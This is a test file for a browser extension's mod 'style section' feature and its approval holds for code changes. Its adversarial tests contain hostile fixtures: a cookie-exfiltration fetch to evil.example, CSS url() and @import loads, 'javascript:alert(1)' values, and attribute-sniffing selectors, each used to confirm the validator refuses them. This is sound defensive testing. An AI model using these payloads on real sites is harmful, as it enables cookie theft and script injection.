'use strict';
// A mod's style section (helper/lib/stylesection.js): parsed and checked, taken out of the code before
// anything reads it, applied by TRIF, and a change to it alone never held (helper/lib/held.js). Also one of
// Tim's mods judged against its shipped version for the sites it runs on.

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { pathToFileURL } = require('url');
const { restyle } = require('../helper/lib/stylesection');
const { buildMod, scanMods } = require('../helper/lib/mods');
const { updateHeld, approveHeld, reviewMod } = require('../helper/lib/held');
const { snapshot } = require('../helper/lib/runs');
const { powersOf, modSites } = require('../helper/lib/powers');
const { tempDir } = require('./fake-extension');
const { sandboxPage } = require('./sandbox-harness');

const lib = () => import(pathToFileURL(path.join(__dirname, '..', 'extension', 'lib.js')).href);
const sandboxJs = () => import(pathToFileURL(path.join(__dirname, '..', 'extension', 'sandbox.js')).href);

const HEAD = (extra = '') => `// ==WebMod==\n// @name Calm\n// @match https://x.com/*\n${extra}// ==/WebMod==\n`;
// A section, as an agent writes it: JSON on // lines
const section = (spec) => `// ==Style==\n${JSON.stringify(spec, null, 2).split('\n').map((l) => `// ${l}`).join('\n')}\n// ==/Style==\n`;
const SPEC = {
  css: ['article { font-size: var(--size); color: var(--accent); }', '.trif-box-x { display: var(--layout) } /* MARKER-CSS */'],
  hide: ['[data-testid=MARKER-HIDE]'],
  settings: {
    size: { type: 'number', value: 16, min: 10, max: 40, unit: 'px' },
    accent: { type: 'colour', value: '#1D9BF0' },
    marks: { type: 'on-off', value: true },
    layout: { type: 'choice', value: 'grid', options: ['block', 'grid'] },
  },
};
const MARKERS = ['MARKER-CSS', 'MARKER-HIDE', 'font-size', '==Style==', '"settings"', '"options"'];
const mod = (code, site = 'x.com', name = 'calm') => buildMod({ site, file: `/nowhere/${site}/${name}.js`, code }).mod;

test('style section: TRIF builds the CSS (settings filled in, the hide list after) and the code gets typed values only', () => {
  const code = `${HEAD()}\n${section(SPEC)}trif.log(trif.style.size);\n`;
  const m = mod(code);
  assert.strictEqual(m.style.css, 'article { font-size: 16px; color: #1d9bf0; }\n.trif-box-x { display: grid } /* MARKER-CSS */\n[data-testid=MARKER-HIDE] { display: none !important; }');
  assert.deepStrictEqual(m.style.values, { size: 16, accent: '#1d9bf0', marks: true, layout: 'grid' });
  // the code: the section's lines blank, so its line numbers are the file's; the file itself is `text`
  assert.strictEqual(m.code.split('\n').length, code.split('\n').length);
  assert.match(m.code.split('\n')[code.split('\n').indexOf('trif.log(trif.style.size);')], /^trif\.log/);
  for (const k of MARKERS) assert.ok(!m.code.includes(k), `${k} isn't in the code`);
  assert.strictEqual(m.text, code);
  // (a mod without one: as it always was, no new fields)
  const plain = mod(`${HEAD()}document.body.style.color = "red";\n`);
  assert.deepStrictEqual(Object.keys(plain).filter((k) => ['style', 'text', 'codeHash'].includes(k)), []);
});

test('style section: the code\'s version (codeHash) stays through a change to it alone; the settings it has, and the code, are the code', () => {
  const v = (spec, body = 'trif.log(trif.style.size);\n', extra = '') => mod(`${HEAD(extra)}${section(spec)}${body}`);
  const a = v(SPEC);
  const restyled = v({ ...SPEC, css: 'article { color: red }', hide: [], settings: { ...SPEC.settings, size: { ...SPEC.settings.size, value: 30 }, layout: { ...SPEC.settings.layout, value: 'block' } } });
  assert.notStrictEqual(restyled.hash, a.hash, 'the file changed: the browser registers it again');
  assert.strictEqual(restyled.codeHash, a.codeHash, 'the code didn\'t');
  // a longer section (more lines): still the same code
  assert.strictEqual(v({ ...SPEC, hide: ['a', 'b', 'c'] }).codeHash, a.codeHash);
  // what a setting is: its range, its choices, its type, a new one
  for (const settings of [
    { ...SPEC.settings, size: { ...SPEC.settings.size, max: 1e9 } },
    { ...SPEC.settings, layout: { ...SPEC.settings.layout, options: ['block', 'grid', 'flex'] } },
    { ...SPEC.settings, extra: { type: 'on-off', value: false } },
  ]) assert.notStrictEqual(v({ ...SPEC, settings }).codeHash, a.codeHash, JSON.stringify(settings));
  assert.notStrictEqual(v(SPEC, 'trif.log(1);\n').codeHash, a.codeHash, 'the code');
  assert.notStrictEqual(v(SPEC, undefined, '// @match https://twitter.com/*\n').codeHash, a.codeHash, 'the header');
});

test('style section: where it goes, and what\'s refused', () => {
  const bad = (code, re) => assert.throws(() => mod(code), re, code);
  const ok = section({ css: 'a { color: red }' });
  // right after the header (blank lines between are fine), once, closed, every line a comment
  assert.ok(mod(`${HEAD()}\n\n${ok}x()`).style);
  bad(`${ok}${HEAD()}x()`, /goes right after the header/);
  bad(`${HEAD()}x();\n${ok}`, /goes right after the header/);
  bad(`x();\n${ok}`, /has no header/);
  bad(`${HEAD()}// ==Style==\n// {}\nx()`, /no closing/);
  bad(`${HEAD()}${ok}${ok}`, /one style section/);
  bad(`${HEAD()}// ==Style==\n{ "css": "" }\n// ==/Style==\n`, /every line of the style section is a \/\/ comment/);
  bad(`${HEAD()}// ==Style==\n// { css: 1 }\n// ==/Style==\n`, /isn't valid JSON/);
  bad(`${HEAD('// @style\n')}${ok}{}`, /a style mod is all style/);
  const spec = (s) => `${HEAD()}${section(s)}x()`;
  bad(spec({ script: 'alert(1)' }), /unknown key "script"/);
  bad(spec({ settings: { size: { type: 'number', value: 50, min: 10, max: 40 } } }), /from 10 to 40/);
  bad(spec({ settings: { size: { type: 'number', value: 5 } } }), /needs "min" and "max"/);
  bad(spec({ settings: { size: { type: 'number', value: 5, min: 0, max: 9, unit: 'px;color:red' } } }), /unit must be one of/);
  bad(spec({ settings: { c: { type: 'colour', value: 'red' } } }), /must be a colour/);
  bad(spec({ settings: { c: { type: 'colour', value: '#fff', label: 'eval me' } } }), /"label" isn't for a colour setting/);
  bad(spec({ settings: { on: { type: 'on-off', value: 'yes' } } }), /true or false/);
  bad(spec({ settings: { t: { type: 'text', value: 'anything' } } }), /number, colour, on-off or choice/);
  bad(spec({ settings: { __proto__x: { type: 'on-off', value: true } } }), /a setting's name is a letter/);
  bad(spec({ settings: { on: { type: 'on-off', value: true } }, css: 'a { color: var(--on) }' }), /on-off setting, which CSS can't use/);
  bad(spec({ css: 'a { background: url(https://evil.example/x.png) }' }), /url\(\) loads from an address/);
  bad(spec({ css: '@import "https://evil.example/a.css";' }), /@import/);
  bad(spec({ css: 'input[value^=a] { color: red }' }), /value attribute/);
  bad(spec({ hide: ['a { } b'] }), /"hide"\[0\]/);
});

test('style section, adversarial: nothing smuggles code, a URL or text into the code through it', () => {
  const spec = (s) => `${HEAD()}${section(s)}x()`;
  // a choice's options are words, not addresses or code; a colour is a colour; a number is in its range
  assert.throws(() => mod(spec({ settings: { to: { type: 'choice', value: 'https://evil.example/', options: ['https://evil.example/', 'b'] } } })), /different words/);
  assert.throws(() => mod(spec({ settings: { to: { type: 'choice', value: 'a', options: ['a', 'fetch("/x")'] } } })), /different words/);
  assert.throws(() => mod(spec({ settings: { c: { type: 'colour', value: 'javascript:alert(1)' } } })), /must be a colour/);
  assert.throws(() => mod(spec({ settings: { n: { type: 'number', value: 1e308, min: 0, max: 1 } } })), /from 0 to 1/);
  // a choice spelling url( with what follows it in the CSS: the CSS is checked after the values are in
  assert.throws(() => mod(spec({ settings: { f: { type: 'choice', value: 'url', options: ['url', 'none'] } }, css: 'a { background: var(--f)(https://evil.example/x) }' })), /url\(\) loads from an address/);
  // CSS may hold a string, as a style mod's may: it's applied, never handed to the code
  const m = mod(spec({ css: 'a::after { content: "fetch(\'https://evil.example/\' + document.cookie)" }' }));
  assert.ok(!m.code.includes('evil.example'));
  // what TRIF reads of the code for powers is what runs: the section isn't there, so a URL in it names no site
  const named = mod(`${HEAD()}${section({ css: 'a::after { content: "https://evil.example/" }' })}fetch("/i/api/mute", { method: "POST" });\n`);
  assert.deepStrictEqual(powersOf(named.code, { sites: modSites(named) }).map((p) => p.key), ['sends']);
  // a section where the code would read it as a string: the header and the section inside a template
  // literal. TRIF blanks the section out of the code whatever is around it, so the string hasn't got it.
  const tpl = mod(`const smuggled = \`\n${HEAD()}${section(SPEC)}\`;\nglobalThis.got = smuggled;\n`);
  for (const k of MARKERS) assert.ok(!tpl.code.includes(k), `${k} isn't in the code`);
  const box = vm.createContext({});
  vm.runInContext(tpl.code, box);
  assert.match(box.got, /==WebMod==/);
  for (const k of MARKERS) assert.ok(!box.got.includes(k), `${k} isn't in the string`);
});

test('style section, adversarial: the free mod\'s own script has no trace of it (its source, toString, sourceURL, currentScript, stack)', async () => {
  const { modToUserScript } = await lib();
  // the code tries every way to read its own text, and keeps what it finds
  const body = [
    'const found = [];',
    'try { found.push(String(document.currentScript && document.currentScript.textContent)); } catch (e) { found.push("x"); }',
    'try { found.push((function probe() {}).toString()); } catch (e) {}',
    'try { found.push(String(new Error("where").stack)); } catch (e) {}',
    'try { found.push(Function.prototype.toString.call(arguments.callee)); } catch (e) { found.push("no callee"); }',
    'try { found.push(JSON.stringify(trif)); found.push(JSON.stringify(Object.getOwnPropertyNames(trif))); found.push(JSON.stringify(trif.style)); } catch (e) { found.push(String(e)); }',
    'window.found = found; window.frozen = Object.isFrozen(trif.style); window.values = trif.style; window.logged = typeof trif.log;',
  ].join('\n');
  const m = mod(`${HEAD()}${section(SPEC)}${body}\n`);
  const reg = modToUserScript(m);
  assert.strictEqual(reg.world, 'MAIN');
  assert.strictEqual(reg.js.length, 2, 'TRIF\'s style script, then the mod\'s own');
  const [styleScript, own] = reg.js.map((j) => j.code);
  for (const k of MARKERS) assert.ok(!own.includes(k), `${k} isn't in the mod's own script`);
  assert.match(styleScript, /MARKER-CSS/);
  assert.ok(!/"settings"|"min"|"options"/.test(styleScript), 'TRIF\'s style script has the CSS only');
  // run them as the page would, in order
  const win = { trif: { log() {}, warn() {}, error() {} }, __webmods: { current: null, errors: [] } };
  const head = { children: [], append(...k) { this.children.push(...k); } };
  win.document = { documentElement: head, head, currentScript: null, createElement: (tag) => ({ tag }), addEventListener() {} };
  win.window = win;
  const ctx = vm.createContext(win);
  for (const code of reg.js.map((j) => j.code)) vm.runInContext(code, ctx);
  assert.deepStrictEqual(win.__webmods.errors, []);
  assert.strictEqual(head.children.length, 1);
  assert.match(head.children[0].textContent, /MARKER-CSS/);
  assert.deepStrictEqual({ ...win.values }, { size: 16, accent: '#1d9bf0', marks: true, layout: 'grid' });
  assert.strictEqual(win.frozen, true);
  assert.strictEqual(win.logged, 'function', 'the rest of trif is the page\'s');
  for (const f of win.found) for (const k of MARKERS) assert.ok(!String(f).includes(k), `${k} in what the code found: ${f}`);
  // an older mod (no section): its script exactly as before
  const plain = mod(`${HEAD()}x();\n`);
  assert.deepStrictEqual(modToUserScript(plain).js.length, 1);
  assert.ok(!modToUserScript(plain).js[0].code.includes('style'));
});

test('style section, adversarial: a boxed mod gets the values as trif.style, its CSS is a sheet of TRIF\'s, the source has none of it', async () => {
  const { modToUserScript } = await lib();
  const { sandboxModCode } = await sandboxJs();
  const m = mod(`${HEAD('// @boxed\n')}${section(SPEC)}trif.log(1);\n`);
  const reg = modToUserScript(m);
  assert.strictEqual(reg.world, 'USER_SCRIPT');
  // the mod's source as the sandbox evaluates it: the first argument handed to __trifSandbox.run
  const calls = [];
  const G = { __trifSandbox: { run: (id, source, grant) => calls.push({ id, source, grant }) } };
  vm.runInContext(reg.js[0].code, vm.createContext(G));
  assert.strictEqual(calls.length, 1);
  for (const k of MARKERS) assert.ok(!calls[0].source.includes(k), `${k} isn't in the source`);
  assert.deepStrictEqual(JSON.parse(JSON.stringify(calls[0].grant.style.values)), { size: 16, accent: '#1d9bf0', marks: true, layout: 'grid' });
  assert.match(calls[0].grant.style.css, /MARKER-CSS/);
  assert.ok(!('settings' in calls[0].grant.style), 'what the settings are stays with the helper');
  // in the sandbox runtime: the mod reads trif.style (frozen values), the CSS goes in a style element of TRIF's
  const page = await sandboxPage();
  page.G.__trifSandbox.run('x.com/calm', 'globalThis.seen = 0; trif.log(JSON.stringify(trif.style)); trif.log(String(Object.isFrozen(trif.style))); trif.log(JSON.stringify(page.styleSheets ? page.styleSheets() : []));', calls[0].grant);
  await page.tick();
  assert.strictEqual(JSON.stringify(page.errors()), "[]");
  const logs = page.G.__trifSandbox.logs.filter((l) => l.mod === 'x.com/calm').map((l) => l.args.join(' '));
  assert.deepStrictEqual(JSON.parse(logs[0]), { size: 16, accent: '#1d9bf0', marks: true, layout: 'grid' });
  assert.strictEqual(logs[1], 'true');
  for (const l of logs) for (const k of MARKERS) assert.ok(!l.includes(k), `${k} in ${l}`);
  assert.strictEqual(page.doc.documentElement.children.filter((c) => c.localName === 'style').length, 1);
  // CSS that loads from an address, sent by anything but the helper: refused, said, not applied
  const p2 = await sandboxPage();
  p2.G.__trifSandbox.run('x.com/bad', 'trif.log("ran")', { powers: [], args: {}, style: { css: 'a { background: url(https://evil.example/x) }', values: { n: 1, s: 'fetch("/x")', o: { a: 1 } } } });
  await p2.tick();
  assert.match(p2.errors().map((e) => e.message).join(' '), /style section's CSS/);
  assert.strictEqual(p2.doc.documentElement.children.filter((c) => c.localName === 'style').length, 0);
  // (and only typed values reach a mod, whatever is sent: not a string that's code, not an object)
  const p3 = await sandboxPage();
  p3.G.__trifSandbox.run('x.com/vals', 'trif.log(JSON.stringify(trif.style))', { powers: [], args: {}, style: { css: '', values: { n: 1, s: 'fetch("/x")', o: { a: 1 }, c: '#abc', w: 'grid' } } });
  await p3.tick();
  assert.deepStrictEqual(JSON.parse(p3.G.__trifSandbox.logs.find((l) => l.mod === 'x.com/vals').args[0]), { n: 1, c: '#abc', w: 'grid' });
  // (and the code a mod without a section gets is as it was)
  assert.ok(!sandboxModCode('x.com/a', 'x()', { powers: [], args: {} }).includes('style'));
});

test('style section, adversarial: the free mod\'s wrapper hands only typed values, whatever the browser was sent', async () => {
  const { modToUserScript, styleOf } = await lib();
  assert.deepStrictEqual(styleOf({ style: { css: 'a{}', values: { n: 2, s: 'alert(1)', u: 'https://evil.example', c: '#ABCDEF', b: false, o: {}, 'bad name': 1 } } }), { css: 'a{}', values: { n: 2, b: false } });
  const reg = modToUserScript({ id: 'x.com/a', matches: ['https://x.com/*'], code: 'x()', style: { css: '', values: { s: '"); alert(1); ("' } } });
  assert.strictEqual(reg.js.length, 1, 'no CSS, no style script');
  assert.ok(!reg.js[0].code.includes('alert'));
});

test('style section: the version that keeps running while a change waits gets the new style (restyle)', () => {
  const was = mod(`${HEAD()}${section(SPEC)}x()`).style;
  const now = mod(`${HEAD()}${section({ ...SPEC, css: 'b { color: blue }', settings: { ...SPEC.settings, size: { type: 'number', value: 99, min: 10, max: 120, unit: 'px' }, accent: { type: 'colour', value: '#ff0000' }, layout: { type: 'choice', value: 'flex', options: ['flex', 'grid'] }, extra: { type: 'on-off', value: true } } })}y()`).style;
  const r = restyle(was, now);
  assert.match(r.css, /^b \{ color: blue \}/);
  // its values where the running version's settings take them; its own for the rest; nothing it hasn't
  assert.deepStrictEqual(r.values, { size: 16, accent: '#ff0000', marks: true, layout: 'grid' });
  assert.strictEqual(restyle(was, null), null);
  assert.deepStrictEqual(restyle(null, now).values, {});
});

// ---- holds -------------------------------------------------------------------------------------------

function makeWs() {
  const home = tempDir();
  const modsDir = path.join(home, 'sites');
  fs.mkdirSync(path.join(modsDir, 'x.com'), { recursive: true });
  return { home, modsDir };
}
const write = (ws, rel, text) => fs.writeFileSync(path.join(ws.modsDir, rel), text);
const scan = (ws) => scanMods(ws.modsDir).mods;

test('updateHeld: a change to the style section alone runs straight away; a change to the code is judged as before', () => {
  const ws = makeWs();
  write(ws, 'x.com/other.js', 'x();\n');
  updateHeld(ws, scan(ws), []); // (TRIF was there before this mod)
  const file = (spec, code) => `${HEAD()}${section(spec)}${code}`;
  const SEND = 'document.body.style.color = "red";\nfetch("/i/api/mute", { method: "POST" });\n';
  write(ws, 'x.com/calm.js', file(SPEC, SEND));
  let held = updateHeld(ws, scan(ws), []);
  assert.deepStrictEqual(held['x.com/calm'].needs, ['sends'], 'new, and it can send: it waits');
  approveHeld(ws.home, 'x.com/calm');
  assert.deepStrictEqual(updateHeld(ws, scan(ws), []), {});
  // the user's follow-up tweaks, by a run on the site and from outside: never held
  for (const spec of [{ ...SPEC, css: 'article { color: red }' }, { ...SPEC, hide: [] }, { ...SPEC, settings: { ...SPEC.settings, size: { ...SPEC.settings.size, value: 30 } } }]) {
    const before = snapshot(ws.modsDir, ws.home);
    write(ws, 'x.com/calm.js', file(spec, SEND));
    assert.deepStrictEqual(updateHeld(ws, scan(ws), [{ runId: 'r1', site: 'x.com', scope: 'x.com', before }]), {}, JSON.stringify(spec));
    write(ws, 'x.com/calm.js', file({ ...spec, hide: ['nav'] }, SEND));
    assert.deepStrictEqual(updateHeld(ws, scan(ws), []), {});
  }
  // a code change that sends somewhere new: held, as it would be without a section
  write(ws, 'x.com/calm.js', file(SPEC, SEND.replace('/i/api/mute', '/i/api/graphql/x/CreateTweet')));
  held = updateHeld(ws, scan(ws), []);
  assert.deepStrictEqual(held['x.com/calm'].needs, ['sends']);
  assert.ok(held['x.com/calm'].codeHash);
  // while it waits, a style edit on top: still waiting for the same code
  write(ws, 'x.com/calm.js', file({ ...SPEC, css: 'p { color: green }' }, SEND.replace('/i/api/mute', '/i/api/graphql/x/CreateTweet')));
  held = updateHeld(ws, scan(ws), []);
  assert.deepStrictEqual(held['x.com/calm'].needs, ['sends']);
  approveHeld(ws.home, 'x.com/calm');
  assert.deepStrictEqual(updateHeld(ws, scan(ws), []), {});
  // and after that OK, style edits run again
  write(ws, 'x.com/calm.js', file({ ...SPEC, css: 'p { color: purple }' }, SEND.replace('/i/api/mute', '/i/api/graphql/x/CreateTweet')));
  assert.deepStrictEqual(updateHeld(ws, scan(ws), []), {});
  const seen = JSON.parse(fs.readFileSync(path.join(ws.home, 'seen.json'), 'utf8'))['x.com/calm'];
  assert.strictEqual(seen.code, scan(ws)[0].codeHash);
});

test('updateHeld: a free mod for every site: a run\'s style edit doesn\'t ask again (its code is the version the user saw); a code edit does', () => {
  const ws = makeWs();
  write(ws, 'x.com/other.js', 'x();\n');
  updateHeld(ws, scan(ws), []);
  const before = () => snapshot(ws.modsDir, ws.home);
  const file = (spec, body) => `// ==WebMod==\n// @match *://*/*\n// ==/WebMod==\n${section(spec)}${body}`;
  let b = before();
  write(ws, 'x.com/free-all.js', file(SPEC, '// one\n'));
  let held = updateHeld(ws, scan(ws), [{ runId: 'r1', site: 'x.com', scope: 'x.com', before: b }]);
  assert.deepStrictEqual(held['x.com/free-all'].needs, ['match:*://*/*']);
  approveHeld(ws.home, 'x.com/free-all');
  b = before();
  write(ws, 'x.com/free-all.js', file({ ...SPEC, css: 'body { margin: 3px }' }, '// one\n'));
  assert.deepStrictEqual(updateHeld(ws, scan(ws), [{ runId: 'r2', site: 'x.com', scope: 'x.com', before: b }]), {});
  b = before();
  write(ws, 'x.com/free-all.js', file(SPEC, '// two, longer\n'));
  held = updateHeld(ws, scan(ws), [{ runId: 'r3', site: 'x.com', scope: 'x.com', before: b }]);
  assert.match(held['x.com/free-all'].reason, /your agent changed it since you allowed that/);
});

test('updateHeld: a run\'s style edit to a mod for another site still waits for that, as a style mod would', () => {
  const ws = makeWs();
  write(ws, 'x.com/wide.js', `// ==WebMod==\n// @match https://x.com/*\n// @match https://bank.example/*\n// ==/WebMod==\n${section(SPEC)}x();\n`);
  assert.deepStrictEqual(updateHeld(ws, scan(ws), []), {}, 'the user\'s, from before');
  const before = snapshot(ws.modsDir, ws.home);
  write(ws, 'x.com/wide.js', `// ==WebMod==\n// @match https://x.com/*\n// @match https://bank.example/*\n// ==/WebMod==\n${section({ ...SPEC, css: 'body { opacity: 0 }' })}x();\n`);
  const held = updateHeld(ws, scan(ws), [{ runId: 'r1', site: 'x.com', scope: 'x.com', before }]);
  assert.deepStrictEqual(held['x.com/wide'].needs, ['match:https://bank.example/*']);
});

test('a boxed mod without TRIF\'s sandbox (Safari): allowed for its code, so a style edit doesn\'t ask again', async () => {
  const { sandboxFallback } = await lib();
  const a = mod(`${HEAD('// @boxed\n')}${section(SPEC)}x()`);
  const b = mod(`${HEAD('// @boxed\n')}${section({ ...SPEC, css: 'p { color: red }' })}x()`);
  const c = mod(`${HEAD('// @boxed\n')}${section(SPEC)}y()`);
  const [held] = sandboxFallback([a], { canSandbox: false });
  assert.strictEqual(held.held.by, 'sandbox');
  assert.strictEqual(held.held.codeHash, a.codeHash);
  const allowed = { [a.id]: `code:${a.codeHash}` };
  assert.ok(!sandboxFallback([b], { canSandbox: false, allowed })[0].held, 'style only');
  assert.strictEqual(sandboxFallback([c], { canSandbox: false, allowed })[0].held.by, 'sandbox', 'the code');
});

test('trif check: a style section is checked and named; a bad one fails the check, with why', async () => {
  const { runCli, writeMod } = require('./fake-extension');
  const home = tempDir();
  const good = writeMod(home, 'x.com', 'calm.js', `${HEAD()}${section(SPEC)}trif.log(trif.style.size);\n`);
  let r = await runCli(['check', good, '--json'], { home });
  assert.strictEqual(r.code, 0, r.stderr);
  assert.deepStrictEqual(JSON.parse(r.stdout).style, { settings: ['size', 'accent', 'marks', 'layout'], lines: [5, 40] });
  r = await runCli(['check', 'x.com/calm'], { home });
  assert.match(r.stdout, /Its style section \(lines 5-40\) checks out, with 4 settings for the code: trif\.style\.size, trif\.style\.accent/);
  assert.match(r.stdout, /a change there alone never waits for the user's OK/);
  const boxed = writeMod(home, 'x.com', 'boxed.js', `${HEAD('// @boxed\n')}${section({ css: 'a { color: red }' })}trif.log(1);\n`);
  r = await runCli(['check', boxed], { home });
  assert.match(r.stdout, /is a boxed mod and parses\nIts style section \(lines 6-10\) checks out\. TRIF applies it/);
  const bad = writeMod(home, 'x.com', 'bad.js', `${HEAD()}${section({ css: 'a { background: url(https://evil.example/) }' })}x();\n`);
  r = await runCli(['check', bad], { home });
  assert.strictEqual(r.code, 1);
  assert.match(r.stdout, /style section: "css": url\(\) loads from an address/);
});

// ---- Tim's mods: judged against their shipped version ---------------------------------------------------

const shippedWs = (code) => {
  const ws = makeWs();
  fs.mkdirSync(path.join(ws.home, '.shipped', 'x.com'), { recursive: true });
  fs.writeFileSync(path.join(ws.home, '.shipped', 'x.com', 'tims.js'), code);
  write(ws, 'x.com/tims.js', code);
  return ws;
};
const TIMS = (matches, body) => `// ==WebMod==\n// @name Tim's\n${matches.map((m) => `// @match ${m}\n`).join('')}// @source webmods\n// @version 3\n// ==/WebMod==\n${body}`;
const POSTS = 'document.querySelector("button.mute").click();\nfetch("/i/api/mute", { method: "POST" });\n';

test('shipped mods: a rewrite that reuses the shipped lines runs; one that adds a power, a line using one, or a site waits', () => {
  const ws = shippedWs(TIMS(['https://x.com/*'], POSTS));
  updateHeld(ws, scan(ws), []);
  // reworded, lines moved, its own lines kept: nothing to ask
  write(ws, 'x.com/tims.js', TIMS(['https://x.com/*'], `// tidied\nconst x = 1;\n${POSTS.split('\n').reverse().join('\n')}`));
  assert.deepStrictEqual(updateHeld(ws, scan(ws), []), {});
  // another path, www., a subdomain of a host it already runs on: the same site
  write(ws, 'x.com/tims.js', TIMS(['https://x.com/home*', 'https://www.x.com/*'], POSTS));
  assert.deepStrictEqual(updateHeld(ws, scan(ws), []), {});
  // a site the shipped version never ran on, while it can send and click: waits, whoever made the change
  write(ws, 'x.com/tims.js', TIMS(['https://x.com/*', 'https://bank.example/*'], POSTS));
  let held = updateHeld(ws, scan(ws), []);
  assert.deepStrictEqual(held['x.com/tims'].needs, ['match:https://bank.example/*']);
  assert.match(held['x.com/tims'].facts[0], /runs on https:\/\/bank\.example\/\*, where Tim's version of this mod doesn't/);
  approveHeld(ws.home, 'x.com/tims');
  assert.deepStrictEqual(updateHeld(ws, scan(ws), []), {}, 'allowed: it doesn\'t ask again');
  // every site
  write(ws, 'x.com/tims.js', TIMS(['https://x.com/*', '*://*/*'], POSTS));
  held = updateHeld(ws, scan(ws), []);
  assert.deepStrictEqual(held['x.com/tims'].needs, ['match:*://*/*']);
  // a run on x.com: one need, the run's words for it
  const before = snapshot(ws.modsDir, ws.home);
  write(ws, 'x.com/tims.js', TIMS(['https://x.com/*', 'https://twitter.com/*'], POSTS));
  held = updateHeld(ws, scan(ws), [{ runId: 'r1', site: 'x.com', scope: 'x.com', before }]);
  assert.deepStrictEqual(held['x.com/tims'].needs, ['match:https://twitter.com/*']);
  assert.match(held['x.com/tims'].facts[0], /outside x\.com/);
  // a new power, or a new line using one it has: waits, as before
  write(ws, 'x.com/tims.js', TIMS(['https://x.com/*'], `${POSTS}location.href = "/home";\n`));
  assert.deepStrictEqual(updateHeld(ws, scan(ws), [])['x.com/tims'].needs, ['navigates']);
  write(ws, 'x.com/tims.js', TIMS(['https://x.com/*'], `${POSTS}fetch("/i/api/graphql/x/CreateTweet", { method: "POST" });\n`));
  assert.deepStrictEqual(updateHeld(ws, scan(ws), [])['x.com/tims'].needs, ['sends']);
  // a domain it talks to that the shipped version doesn't name
  write(ws, 'x.com/tims.js', TIMS(['https://x.com/*'], `${POSTS}const where = "https://collect.example/x";\n`));
  assert.deepStrictEqual(updateHeld(ws, scan(ws), [])['x.com/tims'].needs, ['site:collect.example']);
});

test('shipped mods: a new site for one that can\'t do anything there asks nothing; mail.google.com isn\'t www.google.com', () => {
  const ws = shippedWs(TIMS(['https://x.com/*'], 'document.body.style.color = "red";\n'));
  updateHeld(ws, scan(ws), []);
  write(ws, 'x.com/tims.js', TIMS(['https://x.com/*', 'https://bank.example/*'], 'document.body.style.color = "red";\n'));
  assert.deepStrictEqual(updateHeld(ws, scan(ws), []), {});
  // an exact host: its subdomains are other sites (a sensitive one, here); a *. host takes them in
  const g = makeWs();
  fs.mkdirSync(path.join(g.modsDir, 'www.google.com'));
  fs.mkdirSync(path.join(g.home, '.shipped', 'www.google.com'), { recursive: true });
  const G = (m) => TIMS(m, 'document.querySelector("a.more").click();\n');
  fs.writeFileSync(path.join(g.home, '.shipped', 'www.google.com', 'tims.js'), G(['https://www.google.com/search*']));
  write(g, 'www.google.com/tims.js', G(['https://www.google.com/search*']));
  updateHeld(g, scan(g), []);
  write(g, 'www.google.com/tims.js', G(['https://www.google.com/*']));
  assert.deepStrictEqual(updateHeld(g, scan(g), []), {});
  write(g, 'www.google.com/tims.js', G(['https://www.google.com/*', 'https://mail.google.com/*']));
  assert.deepStrictEqual(updateHeld(g, scan(g), [])['www.google.com/tims'].needs, ['match:https://mail.google.com/*']);
  // (a mod that only says it's Tim's, with no shipped version: judged as any other, where a @match is the user's)
  const o = makeWs();
  write(o, 'x.com/claims.js', TIMS(['https://x.com/*'], POSTS));
  updateHeld(o, scan(o), []);
  reviewMod(o.home, scan(o)[0]);
  write(o, 'x.com/claims.js', TIMS(['https://x.com/*', 'https://bank.example/*'], POSTS));
  assert.deepStrictEqual(updateHeld(o, scan(o), []), {});
});

test('host: while a code change waits, the version that ran is sent with the change\'s style (item: held only for the code part)', async () => {
  const { FakeExtension, waitFor, privDir } = require('./fake-extension');
  const home = tempDir();
  fs.mkdirSync(path.join(home, 'sites', 'example.com'), { recursive: true });
  fs.mkdirSync(privDir(home), { recursive: true });
  fs.writeFileSync(path.join(privDir(home), 'config.json'), JSON.stringify({ env: { PATH: path.join(home, 'nobin') } }));
  const file = path.join(home, 'sites', 'example.com', 'styled.js');
  const v = (spec, code) => `// ==WebMod==\n// @match https://example.com/*\n// ==/WebMod==\n${section(spec)}${code}`;
  const S = (colour, size) => ({ css: '#t { color: var(--c); }', settings: { c: { type: 'colour', value: colour }, n: { type: 'number', value: size, min: 0, max: 10 } } });
  fs.writeFileSync(file, v(S('#111111', 1), 'document.body.dataset.v = "1";\n'));
  const ext = new FakeExtension({ home });
  try {
    await ext.waitForSocket();
    const byId = () => ([...ext.messages].reverse().find((m) => m.type === 'mods')?.mods || []).find((m) => m.id === 'example.com/styled');
    await waitFor(() => byId(), { message: 'the mod sent' });
    // a style edit: sent as it is, nothing waits
    fs.writeFileSync(file, v(S('#222222', 2), 'document.body.dataset.v = "1";\n'));
    let m = await waitFor(() => (byId()?.style?.values.c === '#222222' ? byId() : null), { message: 'the style edit' });
    assert.ok(!m.held && !m.pending);
    // code (now it sends) and style at once: the code waits; the version that ran goes with the new style;
    // a value its settings don't take (n: 99 is outside 0-10 there) stays as it was
    fs.writeFileSync(file, v({ ...S('#333333', 2), settings: { c: { type: 'colour', value: '#333333' }, n: { type: 'number', value: 99, min: 0, max: 100 } } }, 'document.body.dataset.v = "2";\nfetch("/x", { method: "POST" });\n'));
    m = await waitFor(() => (byId()?.pending ? byId() : null), { message: 'the change waiting' });
    assert.doesNotMatch(m.code, /fetch/, 'the code that ran');
    assert.strictEqual(m.style.css, '#t { color: #333333; }');
    assert.deepStrictEqual(m.style.values, { c: '#333333', n: 2 });
    assert.notStrictEqual(m.hash, m.pending.hash);
  } finally { await ext.close(); }
});
